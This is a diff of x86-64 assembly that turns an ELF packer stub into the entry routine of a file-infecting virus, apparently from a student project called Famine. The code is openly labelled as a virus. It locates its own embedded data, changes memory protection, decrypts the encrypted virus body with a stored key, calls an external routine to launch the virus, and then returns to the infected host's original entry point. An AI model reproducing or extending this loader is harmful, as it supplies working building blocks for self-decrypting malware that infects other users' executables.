@@ -1,12 +1,12 @@
 ; **************************************************************************** ;
 ;                                                                              ;
 ;                                                         :::      ::::::::    ;
-;    elf64_payload.s                                    :+:      :+:    :+:    ;
+;    famine.s                                           :+:      :+:    :+:    ;
 ;                                                     +:+ +:+         +:+      ;
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/03 21:29:48 by agrumbac         ###   ########.fr        ;
+;    Updated: 2019/06/07 07:28:34 by agrumbac         ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -17,19 +17,21 @@
 %define CALL_INSTR_SIZE		0x5
 
 section .text
-	global begin_payload
-	global end_payload
+	global famine_entry
+	global _start
 
-begin_payload:
+extern dear_client
+
+famine_entry:
 ;------------------------------; Store variables
 	call mark_below
-	db "128 bit key here", "rel ptld", "ptldsize", "rel text"
-	db "relentry", "textsize"
+	db "128 bit key here", "rel ptld", "ptldsize", "relvirus"
+	db "relentry", "virusize"
 ;------------------------------; Get variables address
 ; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
 ; | rdx  | r8          | r9          | r10         | r11          | r14        |
-; | key  | rel ptld    | ptld size   | rel text    | rel entry    | text size  |
-; | key  | (ptld addr) | (ptld size) | (text addr) | (entry addr) | (text size)|
+; | key  | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
+; | key  | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
 mark_below:
 	pop rax
 	push rdx                   ; backup rdx
@@ -53,7 +55,7 @@ mark_below:
 	mov r11, [r11]
 	mov r14, [r14]
 
-	mov rax, rdx               ; get begin_payload addr
+	mov rax, rdx               ; get famine_entry addr
 	sub rax, CALL_INSTR_SIZE
 
 	push r15                   ; backup r15
@@ -68,10 +70,10 @@ mark_below:
 	sub r11, r15               ; r11 = rax - r11
 	pop r15                    ; restore r15
 
-	push rax                   ; save begin_payload [rsp + 40]
+	push rax                   ; save famine_entry  [rsp + 40]
 	push r8                    ; save ptld addr     [rsp + 32]
 	push r9                    ; save ptld size     [rsp + 24]
-	push r10                   ; save text addr     [rsp + 16]
+	push r10                   ; save virus addr    [rsp + 16]
 	push r11                   ; save entry addr    [rsp + 8]
 	push rdx                   ; save key           [rsp]
 ;------------------------------; Show-off
@@ -99,19 +101,22 @@ mark_below:
 	mov rax, SYSCALL_MPROTECT
 	syscall
 
-;------------------------------; decrypt text
+;------------------------------; decrypt virus
 	mov rdx, [rsp]             ; get key
-	mov r10, [rsp + 16]        ; get text_addr
+	mov r10, [rsp + 16]        ; get virus_addr
 
-	mov rax, r14               ; get text_size
+	mov rax, r14               ; get virus_size
 
-	;decrypt(32, text_addr, key, text_size);
+	;decrypt(32, virus_addr, key, virus_size);
 	mov rdi, 32
 	mov rsi, r10
 	mov rdx, rdx
 	mov rcx, rax
 	call decrypt
-;------------------------------; return to text
+;------------------------------; launch virus if client behaves well
+	mov rdi, rdx
+	call dear_client
+;------------------------------; return to client entry
 	mov r11, [rsp + 8]         ; get entry addr
 	add rsp, 48                ; restore stack as it was
 	pop r14                    ; restore r14
@@ -208,4 +213,3 @@ __while_size_ge_8:
 
 	leave
 	ret
-end_payload:
